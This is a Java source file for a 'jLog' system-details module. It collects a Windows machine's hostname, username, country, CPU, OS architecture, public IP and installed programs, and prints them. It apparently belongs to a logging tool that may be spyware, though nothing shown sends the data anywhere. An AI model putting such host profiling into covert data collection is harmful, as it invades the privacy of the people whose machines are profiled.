package com.Nimex.Functions;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Locale;

import com.sun.jna.platform.win32.Advapi32Util;
import static com.sun.jna.platform.win32.WinReg.HKEY_LOCAL_MACHINE;

public class SystemInformation // [Done]
{
	public static void main(String[] args)
	{
		StringBuilder content = new StringBuilder();
		content.append("==========| jLog || System Details |==========\n");	
		try 
		{
			// System Information
			String t = GetInstalledPrograms.main();
			content.append("Computer Name: " + GetComputerName() + "\n");		
			content.append("Username: " + System.getProperty("user.name") + "\n");
			content.append("Country Name: " + Locale.getDefault().getCountry() + "\n");
			content.append("System date and time: " + GetTime() + "\n");
			content.append("Processor: " + GetCPUInfo() + "\n");
			content.append("Java version: " + System.getProperty("java.version") + "\n");
			content.append("Operating System: " + System.getProperty("os.name") + 
			" | " + GetOSArchitecture() + "\n");
			content.append("IP Address: " + GetIP() + "\n\n");	
				
			// Log Installed Programs		
			content.append("==========| Installed Programs |==========\n");
			content.append(t);
		} 
		catch (Exception e) {}	
		System.out.println(content.toString());
	}
	
	public static String GetIP()
	{
		String ip = "";
		try
		{
			URL url = new URL("http://icanhazip.com/");
		    BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));

		    String s = null;
		    while ((s = reader.readLine()) != null)
		    {
		    	ip = s;
		    }
		    reader.close();
		}
		catch (IOException e) 
		{
			ip = "-";	
		}	
		return ip;
	}
	public static String GetTime()
	{
		SimpleDateFormat time_formatter = new SimpleDateFormat("yyyy/MM/dd - HH:mm:ss");
		String current_time_str = time_formatter.format(System.currentTimeMillis());
		return current_time_str;
	}
	public static String GetComputerName() throws UnknownHostException
	{
		InetAddress addr;
		addr = InetAddress.getLocalHost();
		String hostname = addr.getHostName();
		return hostname;
	}
    public static String GetCPUInfo()
    {
    	String var = (Advapi32Util.registryGetStringValue(HKEY_LOCAL_MACHINE,
	                "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\\",
	              "ProcessorNameString"));   
	    return var;
    }
    public static String GetOSArchitecture()
    {
    	String Architecture = System.getenv("PROCESSOR_ARCHITECTURE");
    	String Arch = System.getenv("PROCESSOR_ARCHITEW6432");

    	String result = Architecture.endsWith("64") || Arch != null && Arch.endsWith("64")
    	                      ? "x64" : "x32";
    	return result;
    }
}
